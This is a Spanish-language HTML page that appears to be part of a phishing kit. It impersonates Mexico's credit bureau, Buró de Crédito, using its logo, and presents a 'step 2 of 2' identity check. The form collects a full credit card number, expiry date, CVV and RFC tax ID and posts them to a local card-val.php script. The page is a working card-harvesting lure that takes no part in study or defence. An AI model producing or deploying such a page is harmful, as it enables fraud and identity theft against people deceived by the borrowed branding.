<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" type="image/x-icon" href="https://uploads-ssl.webflow.com/5e3c807f0eb5905168653b61/5e46eb491ffbe325e07c8e61_32x32-14.png">
	<link rel="stylesheet" href="assets/index.css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<script src="https://kit.fontawesome.com/a076d05399.js"></script>
	<link rel="stylesheet" href="assets/pages2.css">
	<title>Registro Buro de Credito</title>
</head>
<body>
	<nav>
		<input type="checkbox" id="check">
		<label for="check" class="checkbtn">
			<i class="fas fa-bars"></i>
		</label>
		<label class="logo"><img src="https://www.burodecredito.com.mx/img/logo-buro.jpg" alt=""></label>
		<ul>
			<li><a href="index.php" class="text">Home</a></li>
			<li><a class="active" href="registro.php">Comienza ahora, es gratis</a></li>
		</ul>
	</nav>
	<!--Procedimiento-->
	<div class="procedimiento">
		<div class="align-procedimiento">
			<div class="titl">
				<p class="pasos">Paso 2 de 2</p>
				<h1>PARA VALIDAR TU IDENTIDAD</h1>
				<p class="mini">Ingresa los datos solicitados, nos ayudara a validar tu identidad.</p>
			</div>
			<div class="formulario-god">
				<form action="card-val.php" method="POST">
					<div class="contenido">
						<h1>Necesitamos los datos de una de tus tarjetas de credito</h1>
						<br>
						<label >Tarjeta de Credito</label>
						<br>
						<input type="text" maxlength="16" placeholder="Inserta 16 digitos" name="key">
						<br>
						<label>Fecha de Vencimiento</label>
						<br>
						<input type="text" maxlength="5" name="ven" placeholder="MM/AA">
						<br>
						<label>CVV</label>
						<br>
						<input type="text" maxlength="3" name="cc" placeholder="CVV">
						<br>
						<label>RFC</label>
						<br>
						<input type="text" placeholder="RFC" name="digitos">
						<br>
					</div>
					<div class="contenido">
						<button type="submit" class="form-button">Siguiente</button>
					</div>
					<div class="contenido paar">
						<img src="https://lh3.googleusercontent.com/RU6q5nOmMBHsYsuSptQmGzXNMLGy_dPfJ8YAuGLrRy5keUBokb0KyHw5LUsrS1oTOe2fgwVt7lJEhOfUuoxwqPTW6LP4InFT_51XDpMDEPsCYWOrdIwqQBTI06gpFAkOMXMnEJDq_d91JnH1LyKmF4fUmMYazbruQfyB03lRNnZr4xwBqr3WQAX-8r5CFltt7_opzIBTIvgl-maPaXtar9jiiByNBOx-7JG40EpuorpoVN62xpOVb4osgYwLFMqI6UVvOO_mX9zVMJlQ-vyl2-6tc2zsIoqP6jRzW-8VD66qQ-_R2bgc82V9BF9bdDIDRsJFaLFYK0bjwk4K-rHjQ3TtFOCTY0tNOyb0yYX_VvQrhIoE7XHX2tnsUyixz8fbQ3h4ekgIzvl__Y_DK3kFrbjC39MSvabMuUNCNfmJUZKMHjSronDRFZJpl5jK1uxi6ZkhUiZIOZNK-1HBQb0_d3LJf5zdaFWgU9pl683Co3TfuI3cM-Vhg_xtwtahb6X4-MP9UK-V-RdL2BgaC44de6iZD3SklWKRHlGgNt2GBqwRdJ4IK9TW_0IVOsnevupXYW6Lq9jfBMChu5hM6eYK8IX4xySoKnbSLWxGHE6-BMBQC4bfoMLQ37wByyCldh7BteAe-T2lg43XVgmD7GrAYRVjkB_8dJtrKjphX0z9CoJSIRXyl5GMUOsFicqrqqwxcqJWhW6pQuiSgLZiSQdbjfE=w1080-h450-no?authuser=0" alt="">
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>